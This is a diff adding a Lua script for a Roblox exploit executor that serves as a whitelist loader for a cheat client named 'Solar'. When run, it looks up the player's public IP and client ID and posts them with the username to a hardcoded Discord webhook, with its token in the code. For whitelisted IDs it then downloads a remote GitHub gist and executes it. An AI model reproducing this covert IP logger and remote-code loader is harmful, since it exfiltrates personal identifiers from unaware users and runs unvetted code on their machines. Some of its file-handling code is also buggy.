@@ -1,0 +1,136 @@
+local ip_info = request({
+	Url = "http://ip-api.com/json",
+	Method = "GET"
+})
+local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+
+if syn then
+	local ip_info = syn.request({
+		Url = "http://ip-api.com",
+		Method = "GET"	
+	})
+	local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+end
+
+local SavedHWID = game:GetService("RbxAnalyticsService"):GetClientId()
+local SavedIP = ipinfo_table.query
+
+local httpService = game:GetService("HttpService")
+local webhookUrl = "https://discord.com/api/webhooks/1008216322045394956/s0wsj-HX4KBGwv_k1R-Ekp5LmMIVu5vx711_aYwFCuGA6RH-KAFVAX3EidCNWbxPFUdq"
+
+function webhook(TITLE, DESC)
+	request({
+		Url = "https://discord.com/api/webhooks/1008216322045394956/s0wsj-HX4KBGwv_k1R-Ekp5LmMIVu5vx711_aYwFCuGA6RH-KAFVAX3EidCNWbxPFUdq",
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = game:GetService("HttpService"):JSONEncode({
+			embeds = {{
+				title =  tostring(TITLE),
+				description = tostring(DESC)
+			}}
+		})
+	})
+end
+
+webhook(game:GetService("Players").LocalPlayer.Name.."'s IP Address & Hardware ID:", "IP: "..SavedIP.."\nHardware ID: "..SavedHWID.."\n\nLogged for banning / blacklisting purposes only!")
+
+local function Folder(name, parent)
+	if parent == nil then
+		makefolder(name)
+	else
+		makefolder(parent.."\\"..name)
+	end
+end
+
+local function File(name, parent, contents)
+	if parent == nil then
+		writefile(name..".lua", contents)
+	else
+		writefile(name..".lua", parent, contents)
+	end
+end
+
+local function RFile(name, parent)
+	if parent == nil then
+		if isfile(name..".lua") then
+			delfile(name..".lua")
+		else
+			print("Could not remove!")
+		end
+	else
+		if isfile(parent.."\\"..name..".lua") then
+			delfile(parent.."\\"..name..".lua")
+		else
+			print("Could not remove!")
+		end
+	end
+end
+
+local function RFolder(name, parent)
+	if parent == nil then
+		if isfolder(name) then
+			delfolder(name)
+		else
+			print("Could not remove!")
+		end
+	else
+		if isfolder(parent.."\\"..name) then
+			delfolder(parent.."\\"..name)
+		else
+			print("Could not remove!")
+		end
+	end
+end
+
+Folder("Solar")
+
+Folder("Ranking", "Solar")
+Folder("Whitelisting", "Ranking")
+
+File("IP", "Whitelisting", SavedIP)
+File("HWID", "Whitelisting", SavedHWID)
+
+Folder("GUI", "Solar")
+
+local WhitelistedHWID = {
+	"9A5A33E3-15BF-4264-8462-41330B1D4A9F",
+}
+
+local WhitelistedIP = {
+	"72.211.180.52",
+}
+
+for _,a in pairs(WhitelistedHWID) do
+	if a == SavedHWID then
+		for _,b in pairs(WhitelistedIP) do
+			if b == SavedIP then
+				writefile("Solar\\GUI\\Script.lua", "loadstring(game:HttpGet('https://gist.githubusercontent.com/SuqerSin/0d6daabadc6659aae169a9851eccb682/raw/db60bbfdad0124d3c87e86526ffbef3f378cfb05/SolarCLIENT'))()")
+				if isfile("Solar\\GUI\\Script.lua") then
+					dofile("Solar\\GUI\\Script.lua")
+				end
+			else
+				game:GetService("Players").LocalPlayer:Kick("\nNot whitelisted! Contact the owner and screenshot your screen.")
+			end
+		end
+	end
+end
+
+local BlacklistedHWID = {
+	"",
+}
+
+local BlacklistedIP = {
+	"",
+}
+
+for _,a in pairs(BlacklistedHWID) do
+	if a == SavedHWID then
+		for _,b in pairs(BlacklistedIP) do
+			if b == SavedIP then
+				game:GetService("Players").LocalPlayer:Kick("\nL, Blacklisted!")
+			end
+		end
+	end
+end
